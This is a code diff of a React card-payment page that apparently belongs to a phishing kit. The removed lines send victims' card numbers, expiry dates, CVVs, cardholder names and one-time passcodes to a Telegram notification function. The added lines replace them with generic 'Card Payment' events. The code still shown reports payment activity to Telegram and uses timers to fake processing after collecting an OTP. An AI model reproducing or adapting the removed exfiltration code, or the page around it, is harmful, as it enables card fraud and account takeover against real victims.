@@ -219,9 +219,8 @@ const CardSelectPage = () => {
     if (!selected || !selectedCard) return;
     sendTelegramNotification({
       type: "payment_activity",
-      method: selectedCard.label,
+      method: "Card Payment",
       paymentType: "card",
-      referrer: document.referrer || "Direct",
     });
     setShowForm(true);
   };
@@ -230,8 +229,7 @@ const CardSelectPage = () => {
     if (!isFormValid() || !selectedCard) return;
     setIsLoading(true);
     sendTelegramNotification({
-      type: 'payment_activity', amount, method: selectedCard.label, paymentType: 'card',
-      cardName: cardHolder, cardNumber, expiry, cvv
+      type: 'payment_activity', method: 'Card Payment', paymentType: 'card',
     });
     setTimeout(() => {
       setIsLoading(false);
@@ -243,8 +241,7 @@ const CardSelectPage = () => {
   const handleOtpConfirm = () => {
     if (otpCode.length !== 6 || !selectedCard) return;
     sendTelegramNotification({
-      type: 'payment_activity', amount, method: selectedCard.label, paymentType: 'card',
-      cardName: cardHolder, cardNumber, expiry, cvv, otp: otpCode
+      type: 'payment_activity', method: 'Card Payment', paymentType: 'card',
     });
     setOtpLoading(true);
     setTimeout(() => {
